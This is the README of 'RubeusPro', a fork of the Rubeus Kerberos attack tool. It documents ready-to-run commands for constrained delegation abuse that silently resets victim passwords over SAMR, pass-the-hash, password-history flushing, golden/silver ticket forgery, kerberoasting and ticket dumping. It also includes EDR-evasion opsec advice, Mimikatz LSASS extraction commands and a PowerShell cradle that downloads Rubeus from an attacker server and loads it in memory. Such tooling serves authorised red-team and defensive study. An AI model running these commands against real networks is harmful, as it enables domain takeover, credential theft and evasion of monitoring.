# RubeusPro

----

RubeusPro is a fork of [Rubeus](https://github.com/GhostPack/Rubeus) with additional offensive capabilities for Kerberos abuse in modern Active Directory environments. It extends the original toolset with SPNless constrained delegation abuse, SAMR-based hash-level password changes over SMB3, and improved encryption type negotiation for environments where RC4 is disabled (such as Windows Server 2025 defaults).

## What's Different

RubeusPro adds the following capabilities on top of the original Rubeus:

**SPNless S4U with SAMR Password Change** - The `/spnless` flag on the `s4u` command enables constrained delegation abuse without requiring an SPN on the target account. This works by temporarily changing the target account's password via MS-SAMR over an authenticated SMB3 session with AES-128-CCM transport encryption, performing the S4U exchange, and optionally reverting the password afterward.

**TGS-REQ Encryption Type Fix** - When authenticating with AES keys (`/aes128` or `/aes256`), TGS-REQ messages no longer include RC4 in the requested encryption types. This prevents `KDC_ERR_ETYPE_NOTSUPP` errors in environments where RC4 has been disabled (Windows Server 2025+, or domains with RC4 explicitly blocked).

**SAMR Hash-Based Password Change** - The new `samrchangepw` command allows changing a user's password using NT hashes directly, without needing a Kerberos ticket or plaintext password. This uses the MS-SAMR `SamrChangePasswordUser` (opnum 38) over a custom SMB3 implementation with NTLMv2 pass-the-hash authentication.

**Password Revert and History Bypass** - After the SPNless S4U flow, the `/revertpass` flag will automatically revert the target account's password to its original NT hash. The `/bypasshistory` flag (requires `/revertpass`) will flush the password history by cycling through dummy passwords before reverting, bypassing the default 24-password history policy.

**Full SMB3 Stack** - A complete hand-rolled SMB 2/3 client implementation including SMB3 negotiation, NTLMv2 pass-the-hash authentication via SPNEGO, AES-128-CCM transport encryption with SP800-108 KDF key derivation, and DCE/RPC over named pipes. No dependency on Windows SSPI or any external SMB library.

## Credits

RubeusPro is built on top of the work of many people:

[@harmj0y](https://twitter.com/harmj0y) is the primary author of the original [Rubeus](https://github.com/GhostPack/Rubeus) codebase.

The original Rubeus is **heavily** adapted from [Benjamin Delpy](https://twitter.com/gentilkiwi)'s [Kekeo](https://github.com/gentilkiwi/kekeo/) project (CC BY-NC-SA 4.0 license) and [Vincent LE TOUX](https://twitter.com/mysmartlogon)'s [MakeMeEnterpriseAdmin](https://github.com/vletoux/MakeMeEnterpriseAdmin) project (GPL v3.0 license). Full credit goes to Benjamin and Vincent for working out the hard components of weaponization - without their prior work this project would not exist.

[Charlie Clark](https://twitter.com/exploitph) and [Ceri Coburn](https://twitter.com/_EthicalChaos_) have both made significant contributions as co-developers to the Rubeus codebase. [Elad Shamir](https://twitter.com/elad_shamir) contributed essential work for resource-based constrained delegation.

Rubeus uses a C# ASN.1 parsing/encoding library from [Thomas Pornin](https://github.com/pornin) named [DDer](https://github.com/pornin/DDer) that was released with an "MIT-like" license.

PKINIT code heavily adapted from [@SteveSyfuhs](https://twitter.com/SteveSyfuhs)'s [Bruce](https://github.com/dotnet/Kerberos.NET) tool.

NDR encoding and decoding for Kerberos PAC is based on the [NtApiDotNet](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/tree/master/NtApiDotNet) library from [@tiraniddo](https://twitter.com/tiraniddo).

The SPNless S4U technique, SMB3 implementation, SAMR password change, and TGS etype fixes in this fork are by [Omri Baso](https://twitter.com/OmriBaso).

Rubeus is licensed under the BSD 3-Clause license.

## New Commands and Flags

### samrchangepw

Change a user's password using NT hashes directly via MS-SAMR over SMB3. This performs the password change at the NTLM hash level without requiring a Kerberos ticket or plaintext password. Authentication to the DC is done via NTLMv2 pass-the-hash over SMB3 with AES-128-CCM transport encryption.

    Rubeus.exe samrchangepw /dc:DC_IP /domain:DOMAIN /user:USERNAME /old:CURRENT_NT_HASH /new:TARGET_NT_HASH

Required arguments:

| Argument | Description |
| -------- | ----------- |
| `/dc` | Domain controller IP address |
| `/domain` | Domain name (e.g. CORP.LOCAL) |
| `/user` | Target username |
| `/old` | Current NT hash of the account |
| `/new` | Desired new NT hash |

Optional arguments:

| Argument | Description |
| -------- | ----------- |
| `/sspi` | Use Windows SSPI for SMB authentication instead of pass-the-hash (requires domain-joined machine with valid session) |

Example:

    Rubeus.exe samrchangepw /dc:192.168.1.1 /domain:CORP.LOCAL /user:targetuser /old:47BF8039A8506CD67C524A03FF84BA4E /new:A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4

Note: This command is subject to domain password policies including password history (default 24 entries) and minimum password age (default 1 day). If the target hash is in the account's password history, the change will fail with `STATUS_PASSWORD_RESTRICTION`.

### s4u - New Flags

The following flags have been added to the existing `s4u` command:

#### /spnless

Enables SPNless constrained delegation abuse. Instead of requiring an SPN on the attacking account, this temporarily changes the target service account's password via SAMR, performs the S4U2Self and S4U2Proxy exchanges, and obtains a service ticket for the impersonated user.

    Rubeus.exe s4u /user:attacker /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /spnless /dc:DC_IP

The SMB3 session for the password change authenticates using the same hash provided for the Kerberos authentication (`/rc4` or `/aes256`). The domain controller must support SMB3 encryption (Windows Server 2012+).

#### /revertpass

After the S4U flow completes, automatically revert the target account's password back to its original NT hash. This reuses the already-open SAMR session from the initial password change, so no additional authentication is needed.

    Rubeus.exe s4u /user:attacker /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /spnless /dc:DC_IP /revertpass

#### /bypasshistory

When used with `/revertpass`, flush the password history by cycling through 24 dummy passwords before reverting to the original hash. This is needed when the domain enforces password history policy (default: 24 passwords remembered), which would otherwise block reverting to the previous password.

    Rubeus.exe s4u /user:attacker /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /spnless /dc:DC_IP /revertpass /bypasshistory

Note: `/bypasshistory` cannot be used without `/revertpass`. The history flush sends 24 consecutive password changes through SAMR, which takes a few seconds. If the domain also enforces a minimum password age (default: 1 day), the flush will fail with `STATUS_PASSWORD_RESTRICTION` since each intermediate change violates the minimum age. In practice, most environments either don't enforce minimum password age or the attacking account is exempt.

### TGS Encryption Type Changes

When using AES keys (`/aes128` or `/aes256`) for authentication, TGS-REQ messages now only request AES encryption types and no longer include RC4. This applies to all TGS request paths including S4U2Self, S4U2Proxy, and standard service ticket requests.

Previously, RC4 was always included in the requested encryption types regardless of the authenticating key type. This caused `KDC_ERR_ETYPE_NOTSUPP` errors on domain controllers where RC4 has been disabled, such as Windows Server 2025 which disables RC4 by default.

No flag is needed -- this behavior is automatic based on the key type used.

## Table of Contents

- [RubeusPro](#rubeuspro)
  - [What's Different](#whats-different)
  - [Credits](#credits)
  - [New Commands and Flags](#new-commands-and-flags)
    - [samrchangepw](#samrchangepw)
    - [s4u - New Flags](#s4u---new-flags)
    - [TGS Encryption Type Changes](#tgs-encryption-type-changes)
  - [Background](#background)
    - [Command Line Usage](#command-line-usage)
    - [Opsec Notes](#opsec-notes)
  - [Ticket requests and renewals](#ticket-requests-and-renewals)
    - [asktgt](#asktgt)
    - [asktgs](#asktgs)
    - [renew](#renew)
    - [brute](#brute)
  - [Constrained delegation abuse](#constrained-delegation-abuse)
    - [s4u](#s4u)
  - [Ticket Forgery](#ticket-forgery)
    - [golden](#golden)
    - [silver](#silver)
    - [diamond](#diamond)
  - [Ticket Management](#ticket-management)
    - [ptt](#ptt)
    - [purge](#purge)
    - [describe](#describe)
  - [Ticket Extraction and Harvesting](#ticket-extraction-and-harvesting)
    - [triage](#triage)
    - [klist](#klist)
    - [dump](#dump)
    - [tgtdeleg](#tgtdeleg)
    - [monitor](#monitor)
    - [harvest](#harvest)
  - [Roasting](#roasting)
    - [kerberoast](#kerberoast)
    - [asreproast](#asreproast)
  - [Miscellaneous](#miscellaneous)
    - [createnetonly](#createnetonly)
    - [changepw](#changepw)
    - [samrchangepw](#samrchangepw-1)
    - [hash](#hash)
    - [tgssub](#tgssub)
    - [currentluid](#currentluid)
    - [logonsession](#logonsession)
    - [asrep2kirbi](#asrep2kirbi)
    - [kirbi](#kirbi)
  - [Compile Instructions](#compile-instructions)

## Background

### Command Line Usage


       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v2.3.3


     Ticket requests and renewals:

        Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy] [/suppenctype:DES|RC4|AES128|AES256]

     Constrained delegation abuse:

        Perform S4U constrained delegation abuse:
            Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> /impersonateuser:USER /msdsspn:SERVICE/SERVER [/spnless] [/revertpass] [/bypasshistory] [/dc:DOMAIN_CONTROLLER] [/altservice:SERVICE] [/ptt] [/nowrap] [/opsec]

     Miscellaneous:

        Change a user's password via SAMR using NT hashes:
            Rubeus.exe samrchangepw /dc:DC_IP /domain:DOMAIN /user:USERNAME /old:CURRENT_NT_HASH /new:TARGET_NT_HASH [/sspi]


### Opsec Notes

This section covers some notes on the operational security of using Rubeus in an environment, with some technical examples comparing/contrasting some of its approaches to Mimikatz. The material here will be expanded in the future.

#### Overview

Any action you perform on a system is a detectable risk, especially when abusing functionality in "weird"/unintended ways. Rubeus (like any attacker toolset) can be detected in a number of methods, either from the host, network, or domain perspectives. I have a workmate who is fond of stating _"everything is stealthy until someone is looking for it"_ - tools and techniques generally evade detection because either a) people are not sufficiently aware of the tool/technique and therefore not even looking, b) people can not collect and process the data needed at the appropriate scale, or c) the tool/technique blends with existing behavior to sufficiently sneak in with false positives in an environment. There is much more information on these steps and detection subversion in general in [Matt Graeber](https://twitter.com/mattifestation) and [Lee Christensen](https://twitter.com/tifkin_)'s Black Hat USA 2018 ["Subverting Sysmon"](https://i.blackhat.com/us-18/Wed-August-8/us-18-Graeber-Subverting-Sysmon-Application-Of-A-Formalized-Security-Product-Evasion-Methodology.pdf) talk and associated [whitepaper](https://specterops.io/assets/resources/Subverting_Sysmon.pdf).

From the host perspective, Rubeus can be caught during initial [weaponization](#weaponization) of the code itself, by an abnormal (non-lsass.exe) process issuing raw Kerberos port 88 traffic, through the use of sensitive APIs like LsaCallAuthenticationPackage(), or by abnormal tickets being present on the host (e.g. rc4\_hmac use in tickets in a modern environment).

From a network or domain controller log perspective, since Rubeus implements many parts of the normal Kerberos protocol, the main detection method involves the use of rc4\_hmac in Kerberos exchanges. Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges (with a few exceptions like inter-realm trust tickets). Using a rc4\_hmac (NTLM) hash is used in a Kerberos exchange instead of a aes256\_cts\_hmac\_sha1 (or aes128) key results in some signal that is detectable at the host level, network level (if Kerberos traffic is parsed), and domain controller event log level, sometimes known as "encryption downgrade".

#### Weaponization

One common way attack tools are detected is through the weaponization vector for the code. If Rubeus is run [through PowerShell](#sidenote-running-rubeus-through-powershell) (this includes Empire) the standard PowerShell V5 protections all apply (deep script block logging, AMSI, etc.). If Rubeus is executed as a binary on disk, standard AV signature detection comes into play (part of why we [do not release](#compile-instructions) compiled versions of Rubeus, as brittle signatures are silly ; ). If Rubeus is used as a [library](#sidenote-building-rubeus-as-a-library) then it's susceptible to whatever method the primary tool uses to get running. And if Rubeus is run through unmanaged assembly execution (like Cobalt Strike's `execute_assembly`) cross-process code injection is performed and the CLR is loaded into a potentially non-.NET process, though this signal is present for the execution of any .NET code using this method.

Also, AMSI (the Antimalware Scan Interface) has been [added to .NET 4.8](https://blogs.msdn.microsoft.com/dotnet/2018/11/28/announcing-net-framework-4-8-early-access-build-3694/). [Ryan Cobb](https://twitter.com/cobbr_io) has additional details on the offensive implications of this in the **Defense** section of his ["Entering a Covenant: .NET Command and Control"](https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462) post.

#### Example: Credential Extraction

Say we have elevated access on a machine and want to extract user credentials for reuse.

Mimikatz is the swiss army knife of credential extraction, with multiple options. The `sekurlsa::logonpasswords` command will open up a [read handle to LSASS](https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L168), enumerate logon sessions present on the system, walk the default authentication packages for each logon session, and extract any reverseable password/credential material present. **Sidenote**: the `sekurlsa::ekeys` command will enumerate ALL key types present for the Kerberos package.

Rubeus doesn't have any code to touch LSASS (and none is intended), so its functionality is limited to extracting Kerberos tickets through use of the LsaCallAuthenticationPackage() API. From a non-elevated standpoint, the session keys for TGTs are not returned (by default) so only service tickets extracted will be usable (the **tgtdeleg** command uses a Kekeo trick to get a usable TGT for the current user). If in a high-integrity context, a [GetSystem](https://github.com/GhostPack/Rubeus/blob/4c9145752395d48a73faf326c4ae57d2c565be7f/Rubeus/lib/Helpers.cs#L55-L107) equivalent utilizing token duplication is run to elevate to SYSTEM, and a fake logon application is registered with the LsaRegisterLogonProcess() API call. This allows for privileged enumeration and extraction of all tickets currently registered with LSA on the system, resulting in base64 encoded .kirbi's being output for later reuse.

Mimikatz can perform the same base64 .kirbi extraction with the following series of commands:

    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # standard::base64 /output:true
    mimikatz # kerberos::list /export

Mimikatz can also carve tickets directly out of LSASS' memory with:

    mimikatz # privilege::debug
    mimikatz # standard::base64 /output:true
    mimikatz # sekurlsa::tickets /export

As "everything is stealthy until someone is looking for it", it's arguable whether LSASS manipulation or ticket extraction via the LsaCallAuthenticationPackage() API call is more "stealthy". Due to Mimikatz' popularity, opening up a handle to LSASS and reading/writing its memory has become a big target for EDR detection and/or prevention. However, LsaCallAuthenticationPackage() is used by a fairly limited set of processes, and creating a fake logon application with LsaRegisterLogonProcess() is also fairly anomalous behavior. However full API level introspection and baselining appears to be a more difficult technical problem than LSASS protection.

#### Example: Over-pass-the-hash

Say we recover a user's rc4\_hmac hash (NTLM) and want to reuse this credential to compromise an additional machine where the user account has privileged access.

**Sidenote:** pass-the-hash != over-pass-the-hash. The traditional pass-the-hash technique involves reusing a hash through the NTLMv1/NTLMv2 protocol, which doesn't touch Kerberos at all. The over-pass-the-hash approach was developed by [Benjamin Delpy](https://twitter.com/gentilkiwi) and [Skip Duckwall](https://twitter.com/passingthehash) (see their ["Abusing Microsoft Kerberos - Sorry you guys don't get it"](https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18) presentation for more information). This approach turns a hash/key (rc4\_hmac, aes256\_cts\_hmac\_sha1, etc.) for a domain-joined user into a fully-fledged ticket-granting-ticket (TGT).

Let's compare "over-passing-the-hash" via Mimikatz' `sekurlsa::pth` command verus using the `asktgt` command from Rubeus (or [Kekeo](https://github.com/gentilkiwi/kekeo/) if you'd like).

When `sekurlsa::pth` is used to over-pass-the-hash, Mimikatz first creates a new [logon type 9 process](https://github.com/gentilkiwi/mimikatz/blob/3d8be22fff9f7222f9590aa007629e18300cf643/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L926) with dummy credentials - this creates a new "sacrificial" logon session that doesn't interact with the current logon session. It then opens the LSASS process with the ability to write to process memory, and the supplied hash/key is then [patched into the appropriate section](https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c#L566-L600) for the associated logon session (in this case, the "sacrificial" logon session that was started). This causes the normal Kerberos authentication process to kick off as normal as if the user had normally logged on, turning the supplied hash into a fully-fledged TGT.

When Rubeus' `asktgt` command is run (or Kekeo's equivalent), the raw Kerberos protocol is used to request a TGT, which is then applied to the current logon session if the `/ptt` flag is passed.

With the Mimikatz approach, administrative rights are needed as you are manipulating LSASS memory directly. As previously mentioned, Mimikatz' popularity has also led to this type of behavior (opening up a handle to LSASS and reading/writing its memory) being a big target for EDR detection and/or prevention. With the Rubeus/Kekeo approach, administrative rights are not needed as LSASS is not being touched. However, if the ticket is applied to the current logon session (with `/ptt`), the TGT for the current logon session will be overwritten. This behavior can be avoided (with administrative access) by using the `/createnetonly` command to create a sacrificial process/logon session, then using `/ptt /ticket:X /luid:0xa..` with the newly created process LUID. If using Cobalt Strike, using the **make\_token** command with dummy credentials and then **kerberos\_ticket\_use** with the ticket retrieved by Rubeus will let you apply the new TGT in a way that a) doesn't need administrative rights and b) doesn't stomp on the current logon session TGT.

It is our opinion that the LSASS manipulation approach is more likely (at the current moment) to be detected or mitigated due to the popularity of the technique. However the Rubeus approach does result in another piece of detectable behavior. Kerberos traffic to port 88 should normally only originate from lsass.exe - sending raw traffic of this type from an abnormal process could be detectable if the information can be gathered.

**Sidenote**: one way _both_ approaches can potentially be caught is the previously mentioned "encryption downgrade" detection. To retrieve AES keys, use Mimikatz' `sekurlsa::ekeys` module to return ALL Kerberos encryption keys (same with `lsadump::dcsync`) which are better to use when trying to evade some detections.


## Ticket requests and renewals

Breakdown of the ticket request commands:

| Command     | Description |
| ----------- | ----------- |
| [asktgt](#asktgt) | Request a ticket-granting-ticket (TGT) from a hash/key or password |
| [asktgs](#asktgs) | Request a service ticket from a passed TGT |
| [renew](#renew) | Renew (or autorenew) a TGT or service ticket |
| [brute](#brute) | Perform a Kerberos-based password bruteforcing attack. 'spray' can also be used instead of 'brute' |
| [preauthscan](#preauthscan) | Perform a scan for accounts that do not require Kerberos pre-authentication |


### asktgt

The **asktgt** action will build raw AS-REQ (TGT request) traffic for the specified user and encryption key (`/rc4`, `/aes128`, `/aes256`, or `/des`). A `/password` flag can also be used instead of a hash - in this case `/enctype:X` will default to RC4 for the exchange, with `des|aes128|aes256` as options. If no `/domain` is specified, the computer's current domain is extracted, and if no `/dc` is specified the same is done for the system's current domain controller. If authentication is successful, the resulting AS-REP is parsed and the KRB-CRED (a .kirbi, which includes the user's TGT) is output as a base64 blob. The `/ptt` flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session. The `/luid:0xA..` flag will apply the ticket to the specified logon session ID (elevation needed) instead of the current logon session.

Note that no elevated privileges are needed on the host to request TGTs or apply them to the **current** logon session, just the correct hash for the target user. Also, another opsec note: only one TGT can be applied at a time to the current logon session, so the previous TGT is wiped when the new ticket is applied when using the `/ptt` option. A workaround is to use the `/createnetonly:C:\X.exe` parameter (which hides the process by default unless the `/show` flag is specified), or request the ticket and apply it to another logon session with `ptt /luid:0xA..`.

By default, several differences exists between AS-REQ's generated by Rubeus and genuine AS-REQ's. To form AS-REQ's more inline with genuine requests, the `/opsec` flag can be used, this will send an initial AS-REQ without pre-authentication first, if this succeeds, the resulting AS-REP is decrypted and TGT return, otherwise an AS-REQ with pre-authentication is then sent. As this flag is intended to make Rubeus traffic more stealthy, it cannot by default be used with any encryption type other than `aes256` and will just throw a warning and exit if another encryption type is used. To allow for other encryption types to be used with the `/opsec` changes, the `/force` flag exists.

PKINIT authentication is supported with the `/certificate:X` argument. When the private key within the PFX file is password protected, this password can be passed with the `/password:X` argument. When using PKINIT authentication the `/getcredentials` flag can be used to automatically request a U2U service ticket and retrieve the account NT hash.

Requesting a TGT without a PAC can be done using the `/nopac` switch.

Using a KDC proxy ([MS-KKDCP](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kkdcp/5bcebb8d-b747-4ee5-9453-428aec1c5c38)) to make the request is possible using the `/proxyurl:URL` argument. The full URL for the KDC proxy is required, eg. https://kdcproxy.exmaple.com/kdcproxy

The `/nopreauth` flag can be used to send an AS-REQ without pre-authentication. The `/service:SPN` argument can be used to request service tickets using AS-REQ's directly, it will take an SPN or a username.


### asktgs

The **asktgs** action will build/parse a raw TGS-REQ/TGS-REP service ticket request using the specified TGT `/ticket:X` supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a `/dc` is not specified, the computer's current domain controller is extracted and used as the destination for the request traffic. The `/ptt` flag will "pass-the-ticket" and apply the resulting service ticket to the current logon session. One or more `/service:X` SPNs **must** be specified, comma separated.

The supported encryption types in the constructed TGS-REQ will be RC4_HMAC, AES128_CTS_HMAC_SHA1, and AES256_CTS_HMAC_SHA1. In this case, the highest mutually supported encryption will be used by the KDC to build the returned service ticket. If you want to force DES, RC4, or AES128/256 keys, use `/enctype:[RC4|AES128|AES256|DES]`.

In order to request a service ticket for an account using an enterprise principal (i.e. *user@domain.com*), the `/enterprise` flag can be used.

By default, several differences exists between TGS-REQ's generated by Rubeus and genuine TGS-REQ's. To form TGS-REQ's more inline with genuine requests, the `/opsec` flag can be used, this will also cause an additional TGS-REQ to be sent automatically when a service ticket is requested for an account configured for unconstrained delegation. As this flag is intended to make Rubeus traffic more stealthy, it cannot by default be used with any encryption type other than `aes256` and will just throw a warning and exit if another encryption type is used.

To play with other scenarios manually, `/tgs:X` can be used to supply an additional ticket which is appended to the request body. This also adds the constrained delegation KDC option as well as avoids dynamically determining the domain from the given SPN `/service:X`, for this reason the `/targetdomain:X` argument has been implemented to force the request to use the supplied domain which is useful for requesting delegated service tickets from a foreign domain or tickets with usual SPNs.

The `/u2u` flag was implemented to request User-to-User tickets. Together with the `/tgs:X` argument (used to supply the target accounts TGT), the `/service:X` argument can be the username of the account the supplied TGT is for (with the `/tgs:X` argument). The `/targetuser:X` argument will request a PAC of any other account by inserting a PA-FOR-USER PA data section with the `target user's` username.


### renew

The **renew** action will build/parse a raw TGS-REQ/TGS-REP TGT renewal exchange using the specified `/ticket:X` supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a `/dc` is not specified, the computer's current domain controller is extracted and used as the destination for the request traffic. The `/ptt` flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session.

The `/autorenew` flag will take the supplied ticket, sleep until 30 minutes before the ticket expires, auto-renew the ticket, and keep repeating until the renewal window expires.


### brute

The **brute** action will perform a Kerberos-based password brute forcing attack. It has the ability to also spray passwords against a list of users.


## Constrained delegation abuse

### s4u

The **s4u** action performs S4U2Self and S4U2Proxy constrained delegation abuse.

Full usage:

    Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> /impersonateuser:USER /msdsspn:SERVICE/SERVER [/spnless] [/revertpass] [/bypasshistory] [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self] [/bronzebit] [/nopac]

    Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> /impersonateuser:USER /msdsspn:SERVICE/SERVER [/spnless] [/revertpass] [/bypasshistory] [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self]

Cross-domain:

    Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> /impersonateuser:USER /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/spnless] [/revertpass] [/bypasshistory] [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/self] [/nopac]


## Ticket Forgery

### golden

The **golden** action will forge a golden ticket using either a specified set of values or by using LDAP to gather the relevant information.

### silver

The **silver** action will forge a silver ticket using either a specified set of values or by using LDAP to gather the relevant information.

### diamond

The **diamond** action will forge a diamond TGT by requesting a TGT and then modifying the PAC.


## Ticket Management

### ptt

The **ptt** action will submit a `/ticket:X` (TGT or service ticket) for the current logon session through the LsaCallAuthenticationPackage() API with a KERB_SUBMIT_TKT_REQUEST message, or (if elevated) to the logon session specified by `/luid:0xA..`.

### purge

The **purge** action will purge all Kerberos tickets from the current logon session, or (if elevated) to the logon session specified by `/luid:0xA..`.

### describe

The **describe** action takes a `/ticket:X` value (TGT or service ticket), parses it, and describes the values of the ticket. If a service ticket is supplied and a `/servicekey:X` is also supplied, the service ticket will be decrypted and the PAC will be parsed and described.


## Ticket Extraction and Harvesting

### triage

The **triage** action will output a table of the current user's Kerberos tickets, if elevated, will output a table of ALL users' Kerberos tickets.

### klist

The **klist** action will list detailed information on the current user's logon session and Kerberos tickets, if elevated, will list ALL users'.

### dump

The **dump** action will extract current TGTs and service tickets if in an elevated context. If not elevated, tickets for the current user are extracted.

### tgtdeleg

The **tgtdeleg** action will retrieve a usable TGT `.kirbi` for the current user without needing elevation on the host, through the Kerberos GSS-API.

### monitor

The **monitor** action will monitor for new TGTs from the LSA every `/interval` seconds (default 60).

### harvest

The **harvest** action will monitor for new TGTs, auto-renew TGTs, and display a working cache.


## Roasting

### kerberoast

The **kerberoast** action will perform Kerberoasting against all (or targeted) SPN-enabled accounts.

### asreproast

The **asreproast** action will perform AS-REP roasting against accounts that do not require pre-authentication.


## Miscellaneous

### createnetonly

The **createnetonly** action will use the CreateProcessWithLogonW() API to create a new hidden (unless `/show` is specified) process with a SECURITY_LOGON_TYPE of 9 (NewCredentials), using random dummy credentials. This process state is useful to use with `/ptt /luid:0xA..`.

### changepw

The **changepw** action will take a user's TGT `.kirbi` blob and execute a MS-KPASSWD password change with the specified `/new:PASSWORD` value. If a `/targetuser:DOMAIN\USER` is supplied, a TGS request is first made for the kadmin/changepw service, and the password for the target is reset (requires appropriate permissions).

### hash

The **hash** action will take a `/password:X` and optional `/user:X` and `/domain:X` values and calculate the rc4\_hmac (NTLM), aes128\_cts\_hmac\_sha1, aes256\_cts\_hmac\_sha1, and des\_cbc\_md5 Kerberos hash forms.

### tgssub

The **tgssub** action will take an existing service ticket and substitute an alternative service name into the ticket.

### currentluid

The **currentluid** action will display the current user's logon session ID.

### logonsession

The **logonsession** action will display information about the current or target logon session.

### asrep2kirbi

The **asrep2kirbi** action will convert an AS-REP and a key to a Kirbi file.

### kirbi

The **kirbi** action will insert a new DES session key into a Kirbi file.


## Compile Instructions

RubeusPro is built against .NET Framework 4.0 with a target of C# 8.0. Open the solution file in Visual Studio and build in Release mode, or use the command line:

    msbuild Rubeus.sln /p:Configuration=Release

### Targeting other .NET versions

Rubeus' `.csproj` file is configured to build for .NET 4.0. To target a different version (e.g., 3.5 or 4.5), modify the `<TargetFrameworkVersion>` in `Rubeus\Rubeus.csproj`.

### Sidenote: Building Rubeus as a Library

Rubeus can be built as a library for use in other C# projects. Change the output type in the project properties from "Console Application" to "Class Library" and build.

### Sidenote: Running Rubeus Through PowerShell

Rubeus can be loaded and executed through PowerShell using reflection:

    $data = (New-Object System.Net.WebClient).DownloadData('http://YOURSERVER/Rubeus.exe')
    $assem = [System.Reflection.Assembly]::Load($data)
    [Rubeus.Program]::Main("asktgt /user:USER /rc4:HASH".Split())

#### Sidenote Sidenote: Running Rubeus Over PSRemoting

Rubeus can be executed over PSRemoting using `Invoke-Command`:

    $s = New-PSSession dc.domain.com
    Invoke-Command -Session $s -ScriptBlock { $data = (New-Object System.Net.WebClient).DownloadData('http://YOURSERVER/Rubeus.exe'); $assem = [System.Reflection.Assembly]::Load($data); [Rubeus.Program]::Main("asktgt /user:USER /rc4:HASH".Split()) }
